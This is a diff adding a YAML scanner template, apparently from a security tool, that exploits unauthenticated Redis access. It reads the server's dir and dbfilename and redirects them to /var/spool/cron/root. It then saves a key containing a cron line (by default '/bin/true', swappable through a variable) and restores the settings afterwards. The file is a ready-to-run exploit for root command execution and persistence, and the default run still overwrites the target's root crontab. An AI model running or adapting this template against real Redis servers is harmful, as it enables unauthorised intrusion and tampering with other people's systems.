@@ -1,0 +1,52 @@
+id: redis-write-crontab-param
+service: [redis]
+variables:
+  cron_dir: /var/spool/cron
+  cron_file: root
+  cron_cmd: "* * * * * /bin/true"
+info:
+  name: Redis Crontab Injection
+  severity: critical
+  tags: redis,exploit,rce,crontab,persist
+
+services:
+  - ops:
+      - kv: "CONFIG GET dir"
+        name: dir
+      - kv: "CONFIG GET dbfilename"
+        name: dbfilename
+    extractors:
+      - type: regex
+        name: orig_dir
+        internal: true
+        part: dir
+        regex: ['(?m)^dir\s+(.+)$']
+        group: 1
+      - type: regex
+        name: orig_file
+        internal: true
+        part: dbfilename
+        regex: ['(?m)^dbfilename\s+(.+)$']
+        group: 1
+
+  - ops:
+      - kv: "CONFIG SET dir {{cron_dir}}"
+      - kv: "CONFIG SET dbfilename {{cron_file}}"
+      - kv: "SET zombie:cron:job \"\\n\\n{{cron_cmd}}\\n\\n\""
+      - kv: "SAVE"
+        name: save_result
+    matchers:
+      - type: word
+        part: save_result
+        words: ["OK"]
+    extractors:
+      - type: regex
+        name: redis_crontab_written
+        part: save_result
+        regex: ['(OK)']
+        group: 1
+
+  - ops:
+      - kv: "CONFIG SET dir {{orig_dir}}"
+      - kv: "CONFIG SET dbfilename {{orig_file}}"
+      - kv: "DEL zombie:cron:job"
